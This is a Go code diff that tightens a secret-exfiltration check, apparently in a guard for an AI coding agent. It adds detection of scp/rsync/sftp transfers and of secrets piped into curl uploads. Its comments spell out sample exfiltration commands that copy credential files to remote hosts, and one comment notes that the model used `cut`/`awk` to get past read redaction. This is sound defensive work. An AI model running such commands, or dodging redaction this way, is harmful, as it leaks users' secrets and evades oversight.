@@ -82,6 +82,13 @@ var (
 	// Not a local file: stdin, a URL, or a fragment of JSON/an inline payload.
 	dlpNotAFileTok = regexp.MustCompile(`^[@{[]`)
 
+	// The transfers that name their source POSITIONALLY, with no flag in front of
+	// it: `scp creds.env user@host:/tmp/x`. None of the patterns above see that
+	// file, so the commonest way to copy one off a machine went unchecked.
+	dlpPositionalCmd = regexp.MustCompile(`\b(scp|rsync|sftp)\b`)
+	// The DESTINATION of such a command, which is not a local file to scan.
+	dlpRemoteTarget = regexp.MustCompile(`^[\w.-]*@?[\w.-]+:`)
+
 	// The reader list for read redaction is broad on purpose: agy cannot redact
 	// tool OUTPUT, so any text-processing tool that can print a file's contents is
 	// a redaction dodge if it is missing here — the model reached for `cut`/`awk`
@@ -258,7 +265,11 @@ func egressSecretCheck(args map[string]interface{}, sec *sgshared.Security, cwd 
 			base = wd
 		}
 	}
-	for _, c := range sgpolicy.ExtractCommands(args) {
+	// PIPELINES, not commands. ExtractCommands splits on `|` too, which is right for
+	// a policy rule and wrong here: `cat creds.env | curl -d @- https://…` split into a
+	// half with no transfer command and a half whose only file is `-`, so a secret
+	// piped into an upload was seen by neither. hooks/guard.mjs had the same bug.
+	for _, c := range sgpolicy.ExtractPipelines(args) {
 		lc := strings.ToLower(c)
 		if !dlpTransferCmd.MatchString(lc) {
 			continue
@@ -272,15 +283,31 @@ func egressSecretCheck(args map[string]interface{}, sec *sgshared.Security, cwd 
 		// secret-bearing files in one command.
 		var files []string
 		seen := map[string]bool{}
+		add := func(f string) {
+			if f == "" || f == "-" || sgpolicy.HTTPPrefix.MatchString(f) || dlpNotAFileTok.MatchString(f) {
+				return
+			}
+			if !seen[f] {
+				seen[f] = true
+				files = append(files, f)
+			}
+		}
 		for _, re := range dlpEgressFileRes {
 			for _, m := range re.FindAllStringSubmatch(c, -1) {
-				f := m[1]
-				if f == "" || f == "-" || sgpolicy.HTTPPrefix.MatchString(f) || dlpNotAFileTok.MatchString(f) {
-					continue
-				}
-				if !seen[f] {
-					seen[f] = true
-					files = append(files, f)
+				add(m[1])
+			}
+		}
+		// Positional sources. Every token that could be a path is a candidate; what
+		// decides is still the content scan below, and a token that is not a file
+		// fails the stat, so widening the net costs a stat and cannot cause a block.
+		if dlpPositionalCmd.MatchString(lc) {
+			toks := strings.Fields(c)
+			if len(toks) > 1 {
+				for _, tok := range toks[1:] {
+					if strings.HasPrefix(tok, "-") || dlpRemoteTarget.MatchString(tok) {
+						continue
+					}
+					add(strings.TrimPrefix(tok, "@"))
 				}
 			}
 		}
